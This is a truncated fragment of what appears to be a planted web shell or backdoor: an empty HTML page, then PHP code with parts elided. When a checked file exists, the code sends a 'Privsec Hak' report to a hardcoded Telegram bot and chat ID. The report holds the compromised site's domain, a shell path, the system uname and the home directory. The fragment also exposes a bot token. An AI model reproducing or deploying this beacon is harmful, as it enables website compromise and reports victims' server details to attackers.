<!DOCTYPEhtml> <html> <head> <title>  </title> <scripttype = "text/javascript"src = "https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"> </script>
	</head>
</html>
<?php
...
if (file_exists($check)) {
    ...
    $data = ['chat_id' => '5188663019', 'text' => "Privsec Hak : 
 Domen : http://$domen/$nama?Chitoge
 Uname : $sys 
 DIR : $home  
"];
    $response = file_get_contents("https://api.telegram.org/bot5436457365:AAE9FYdM7GmqxDaylGc7oLp9jBnfXjNI8NU/sendMessage?" . http_build_query($data));
} else {
    $p = "http://";
